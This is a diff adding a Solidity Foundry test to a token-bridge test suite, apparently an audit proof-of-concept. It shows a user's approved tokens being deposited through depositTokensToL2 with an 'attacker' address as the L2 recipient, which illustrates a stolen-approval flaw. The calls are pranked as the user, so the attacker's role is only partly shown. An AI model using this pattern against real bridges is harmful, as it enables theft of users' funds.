@@ -223,4 +223,20 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+    function testCanMoveApprovedTokensofOtherUs() public {
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+        
+        uint256 depositAmount = token.balanceOf(user);
+        address attacker = makeAddr("attacker");
+        vm.startPrank(user);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, depositAmount);
+        tokenBridge.depositTokensToL2(user, attacker, depositAmount);
+
+        assertEq(token.balanceOf(address(user)), 0);
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+        vm.stopPrank();
+    }
 }
